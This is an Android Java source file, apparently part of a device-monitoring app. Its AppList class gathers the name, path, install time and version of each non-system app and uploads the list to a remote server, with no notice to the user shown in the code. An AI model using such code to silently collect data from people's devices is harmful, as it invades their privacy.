package com.inet.android.list;

import java.io.ByteArrayOutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.util.Base64;

import com.inet.android.bs.NetworkChangeReceiver;
import com.inet.android.request.AppConstants;
import com.inet.android.request.RequestList;
import com.inet.android.utils.AppSettings;
import com.inet.android.utils.Logging;
import com.loopj.android.http.RequestParams;

/**
 * ListApp class is designed to get the list of applications
 * 
 * @author johny homicide
 * 
 */
@SuppressLint("NewApi")
public class AppList {
	private Context mContext;
	private String complete;
	private static String LOG_TAG = AppList.class.getSimpleName().toString();
	private final int COMPRESSION_QUALITY = 100;
	private int version;

	/**
	 * get the list of all installed applications in the device
	 * 
	 * @return ArrayList of installed applications or null
	 */
	@SuppressLint("NewApi")
	public void getListOfInstalledApp(Context context) {
		this.mContext = context;
		version = AppSettings.getSetting(AppConstants.TYPE_LIST_APP, mContext);
		String sendStr = null;

		Logging.doLog(LOG_TAG, "getListOfInstalledApp", "getListOfInstalledApp");

		// -------initial json line----------------------
		RequestParams params = new RequestParams();
		List<Map<String, String>> listOfMapsForData = new ArrayList<Map<String, String>>();

		if (NetworkChangeReceiver.isOnline(context) != 0) {
			int flags = PackageManager.GET_META_DATA
					| PackageManager.GET_SHARED_LIBRARY_FILES
					| PackageManager.GET_UNINSTALLED_PACKAGES;
			PackageManager packageManager = context.getPackageManager();
			final List<ApplicationInfo> installedApps = packageManager
					.getInstalledApplications(flags);

			for (ApplicationInfo app : installedApps) {
				if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 1) {
					// System application

				} else {
					try {
						Logging.doLog(LOG_TAG, "ApplicationInfo",
								"ApplicationInfo");
						PackageInfo packageInfo = packageManager
								.getPackageInfo(app.packageName,
										PackageManager.GET_PERMISSIONS);
						SimpleDateFormat dateFormat = new SimpleDateFormat(
								"yyyy-MM-dd HH:mm:ss");

						String installTime = dateFormat.format(new Date(
								packageInfo.firstInstallTime));
						// -----------get Icon
						// App-------------------------------------
						Drawable icon = packageInfo.applicationInfo
								.loadIcon(context.getPackageManager());
						String encodedImage = null;
						Bitmap bitmap = ((BitmapDrawable) icon).getBitmap();
						if (bitmap != null) {
							ByteArrayOutputStream byteArrayBitmapStream = new ByteArrayOutputStream();
							bitmap.compress(Bitmap.CompressFormat.PNG,
									COMPRESSION_QUALITY, byteArrayBitmapStream);
							byte[] b = byteArrayBitmapStream.toByteArray();
							encodedImage = Base64.encodeToString(b,
									Base64.DEFAULT);
							// params.add("data[][info][icon]", encodedImage);

						}
						// ------------------------------------------------------
						// Send Data
						// ------------------------------------------------------
						Map<String, String> data1 = new HashMap<String, String>();
						data1.put("dir", app.sourceDir);
						data1.put("name",app.loadLabel(packageManager).toString());
						data1.put("time", installTime);
						data1.put("build",Integer.toString(packageInfo.versionCode));
						listOfMapsForData.add(data1);

						// params.add("data[][info][name]",
						// app.loadLabel(packageManager).toString());
						// params.add("data[][info][dir]", app.sourceDir);
						// params.add("data[][info][time]", installTime);
						// params.add("data[][info][build]",
						// Integer.toString(packageInfo.versionCode));

						// if (sendStr == null)
						// sendStr = jsonAppList.toString();
						// else
						// sendStr += "," + jsonAppList.toString();
						// if (sendStr.length() >= 50000) {
						// complete = "0";
						// Logging.doLog(LOG_TAG, "str >= 50000",
						// "str >= 50000");
						// sendRequest(sendStr, complete);
						// sendStr = null;
						//
						// }
					} catch (PackageManager.NameNotFoundException e) {
						e.printStackTrace();

					}
				}
			}
			if (params.hashCode() != 0) {
				// lastRaw(params);
				params.put("data", listOfMapsForData);
				RequestList.sendDemandRequest(params,
						AppConstants.TYPE_LIST_APP_REQUEST, "1", version,
						mContext);
				sendStr = null;

			} else {
				lastRaw("");
				sendStr = null;
			}
		} else {
			Queue.setList(AppConstants.TYPE_LIST_APP, version, "0", mContext);
		}
	}

	private void lastRaw(String sendStr) {
		complete = "1";
		Logging.doLog(LOG_TAG, "Send complete 1 ..", "Send complete 1 ..");
		sendRequest(sendStr, complete);
	}

	private void sendRequest(String str, String complete) {
		RequestList.sendDemandRequest(str, AppConstants.TYPE_LIST_APP_REQUEST,
				complete, version, mContext);
	}
}